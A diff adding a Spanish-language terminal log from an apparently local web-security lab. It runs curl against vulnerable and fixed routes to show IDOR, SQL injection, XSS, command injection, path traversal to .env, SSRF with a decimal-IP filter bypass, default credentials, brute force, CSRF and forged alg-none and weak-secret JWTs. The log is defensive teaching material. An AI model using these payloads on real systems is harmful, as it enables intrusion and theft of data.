@@ -1,0 +1,157 @@
+node v24.19.0 | curl 8.18.0 | Linux 6.18.33.2-microsoft-standard-WSL2
+
+### login ana (vulnerable), cabecera Set-Cookie
+$ curl -s -i -c /tmp/lab-cookies -X POST http://127.0.0.1:3000/v/login -d nombre=ana -d clave=ana-clave-larga | grep -i set-cookie
+Set-Cookie: sid=afac52348cec43c637d013c25a5085ee; Path=/
+
+
+### IDOR vulnerable: ana pide la factura 3 de luis
+$ curl -s -b /tmp/lab-cookies http://127.0.0.1:3000/v/facturas/3
+{"id":3,"duenio":2,"concepto":"Consultoría de luis","total":900}
+
+### IDOR corregido
+$ curl -s -o /dev/null -w '%{http_code}' -b /tmp/lab-cookies http://127.0.0.1:3000/f/facturas/3
+404
+
+### SQL normal
+$ curl -s -b /tmp/lab-cookies -G http://127.0.0.1:3000/v/buscar --data-urlencode q=Hosting
+[{"id":1,"concepto":"Hosting de ana","total":120}]
+
+### SQL inyectada
+$ curl -s -b /tmp/lab-cookies -G http://127.0.0.1:3000/v/buscar --data-urlencode "q=' OR 1=1 --"
+[{"id":1,"concepto":"Hosting de ana","total":120},{"id":2,"concepto":"Dominio de luis","total":15},{"id":3,"concepto":"Consultoría de luis","total":900}]
+
+### SQL corregida con la misma entrada
+$ curl -s -b /tmp/lab-cookies -G http://127.0.0.1:3000/f/buscar --data-urlencode "q=' OR 1=1 --"
+[]
+
+### error detallado vulnerable
+$ curl -s -G http://127.0.0.1:3000/v/ordenar --data-urlencode 'campo=nada'
+{"error":"no such column: nada","stack":"Error: no such column: nada\n    at file:///mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/lab.mjs:111:17\n    at Layer.handleRequest (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/lib/layer.js:152:17)\n    at next (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/lib/route.js:157:13)\n    at Route.dispatch (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/lib/route.js:117:3)\n    at handle (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/index.js:435:11)\n    at Layer.handleRequest (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/lib/layer.js:152:17)\n    at /mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/index.js:295:15\n    at processParams (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/index.js:582:12)\n    at next (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/router/index.js:291:5)\n    at cookieParser (/mnt/c/Users/alexh/AppData/Local/Temp/claude/D--GitHub-Personal-Portfolio/1f04f0ad-a4f5-48a9-a3e8-36884428891b/scratchpad/ataques/node_modules/cookie-parser/index.js:57:14)"}
+
+### error detallado corregido
+$ curl -s -G http://127.0.0.1:3000/f/ordenar --data-urlencode 'campo=nada'
+{"error":"campo no válido"}
+
+### XSS vulnerable
+$ curl -s -G http://127.0.0.1:3000/v/saludo --data-urlencode 'nombre=<img src=x onerror=alert(document.cookie)>'
+<p>Hola, <img src=x onerror=alert(document.cookie)></p>
+
+### XSS corregido
+$ curl -s -G http://127.0.0.1:3000/f/saludo --data-urlencode 'nombre=<img src=x onerror=alert(document.cookie)>'
+<p>Hola, &lt;img src=x onerror=alert(document.cookie)&gt;</p>
+
+### órdenes normal
+$ curl -s -G http://127.0.0.1:3000/v/dns --data-urlencode 'host=localhost'
+::1             localhost
+
+
+### órdenes inyectada
+$ curl -s -G http://127.0.0.1:3000/v/dns --data-urlencode 'host=localhost; id'
+::1             localhost
+uid=1000(alexh) gid=1000(alexh) groups=1000(alexh),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users)
+
+
+### órdenes corregida
+$ curl -s -w ' [%{http_code}]' -G http://127.0.0.1:3000/f/dns --data-urlencode 'host=localhost; id'
+host no válido [400]
+
+### órdenes corregida, nombre válido
+$ curl -s -G http://127.0.0.1:3000/f/dns --data-urlencode 'host=localhost'
+::1             localhost
+
+
+### rutas normal
+$ curl -s -G http://127.0.0.1:3000/v/docs --data-urlencode 'nombre=manual.txt'
+Manual de uso
+
+
+### rutas vulnerable
+$ curl -s -G http://127.0.0.1:3000/v/docs --data-urlencode 'nombre=../.env'
+DB_PASSWORD=super-secreta
+
+
+### rutas corregida
+$ curl -s -o /dev/null -w '%{http_code}' -G http://127.0.0.1:3000/f/docs --data-urlencode 'nombre=../.env'
+403
+
+### rutas corregida, nombre válido
+$ curl -s -G http://127.0.0.1:3000/f/docs --data-urlencode 'nombre=manual.txt'
+Manual de uso
+
+
+### SSRF vulnerable
+$ curl -s -G http://127.0.0.1:3000/v/vista-previa --data-urlencode 'url=http://127.0.0.1:4001/admin'
+servicio interno: clave-de-base-de-datos=NO-DEBERIA-SALIR
+
+### SSRF filtro por texto
+$ curl -s -G http://127.0.0.1:3000/v2/vista-previa --data-urlencode 'url=http://127.0.0.1:4001/admin'
+bloqueado
+
+### SSRF filtro por texto, IP en decimal
+$ curl -s -G http://127.0.0.1:3000/v2/vista-previa --data-urlencode 'url=http://2130706433:4001/admin'
+servicio interno: clave-de-base-de-datos=NO-DEBERIA-SALIR
+
+### SSRF corregido, IP en decimal
+$ curl -s -w ' [%{http_code}]' -G http://127.0.0.1:3000/f/vista-previa --data-urlencode 'url=http://2130706433:4001/admin'
+destino no permitido [400]
+
+### SSRF corregido, destino permitido
+$ curl -s -w ' [%{http_code}]' -G http://127.0.0.1:3000/f/vista-previa --data-urlencode 'url=https://example.com/' | head -c 120
+<!doctype html><html lang="en"><head><title>Example Domain</title><link rel="icon" href="data:,"><meta name="viewport" c
+
+### cuenta de fábrica
+$ curl -s -X POST http://127.0.0.1:3000/v/login -d nombre=admin -d clave=admin
+{"ok":true}
+
+### fuerza bruta vulnerable: 20 intentos
+$ for i in $(seq 1 20); do curl -s -o /dev/null -w '%{http_code} ' -X POST http://127.0.0.1:3000/v/login -d nombre=luis -d clave=intento$i; done
+401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 401 
+
+### fuerza bruta corregida: 8 intentos
+$ for i in $(seq 1 8); do curl -s -o /dev/null -w '%{http_code} ' -X POST http://127.0.0.1:3000/f/login -d nombre=luis -d clave=intento$i; done
+401 401 401 401 401 429 429 429 
+
+### fuerza bruta corregida: Retry-After
+$ curl -s -i -X POST http://127.0.0.1:3000/f/login -d nombre=luis -d clave=luis-clave-larga | grep -iE '^HTTP|retry-after'
+HTTP/1.1 429 Too Many Requests
+Retry-After: 900
+
+
+### cookie corregida (ana)
+$ curl -s -i -X POST http://127.0.0.1:3000/f/login -d nombre=ana -d clave=ana-clave-larga | grep -i set-cookie
+Set-Cookie: sid=i9tjx5WTN_pZhYkMEXttZEBrco9tI2bnVpRd66Ry2I8; Max-Age=7200; Path=/; Expires=Mon, 28 Sep 2026 03:43:55 GMT; HttpOnly; Secure; SameSite=Lax
+
+
+### CSRF vulnerable: petición desde otro sitio
+$ curl -s -b /tmp/lab-cookies -H 'Sec-Fetch-Site: cross-site' -X POST http://127.0.0.1:3000/v/email -d email=atacante@ejemplo.test
+{"cambiado":true,"email":"atacante@ejemplo.test"}
+
+### CSRF corregido: petición desde otro sitio
+$ curl -s -b /tmp/lab-cookies -H 'Sec-Fetch-Site: cross-site' -X POST http://127.0.0.1:3000/f/email -d email=atacante@ejemplo.test
+{"error":"origen no permitido"}
+
+### JWT: el contenido se lee sin la clave
+$ curl -s http://127.0.0.1:3000/f/token | cut -d. -f2 | base64 -d 2>/dev/null; echo
+{"sub":"ana","rol":"usuario","iat":1790559836,"exp":1790560736,"aud":"app-web","iss":"https://api.ejemplo.test"}
+
+
+### JWT alg none contra jwt.decode
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiJ9.' http://127.0.0.1:3000/v/perfil
+{"hola":"ana","rol":"admin"}
+
+### JWT alg none contra jwt.verify por defecto
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiJ9.' http://127.0.0.1:3000/v2/perfil
+{"error":"jwt signature is required"}
+
+### JWT firmado con 'secret' contra el secreto débil
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU1OTgzNn0.6FD9zo_oUJhOpixN44cucfk-zwhof82l-0vESY8tg4w' http://127.0.0.1:3000/v2/perfil
+{"hola":"ana","rol":"admin"}
+
+### JWT firmado con 'secret' contra el corregido
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJhZG1pbiIsImlhdCI6MTc5MDU1OTgzNn0.6FD9zo_oUJhOpixN44cucfk-zwhof82l-0vESY8tg4w' http://127.0.0.1:3000/f/perfil
+{"error":"invalid signature"}
+
+### JWT legítimo contra el corregido
+$ curl -s -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbmEiLCJyb2wiOiJ1c3VhcmlvIiwiaWF0IjoxNzkwNTU5ODM2LCJleHAiOjE3OTA1NjA3MzYsImF1ZCI6ImFwcC13ZWIiLCJpc3MiOiJodHRwczovL2FwaS5lamVtcGxvLnRlc3QifQ.no5esORzFplMvfTwXQJqRWm8-jNAI6eW2nB82vZYC5Y' http://127.0.0.1:3000/f/perfil
+{"hola":"ana","rol":"usuario"}
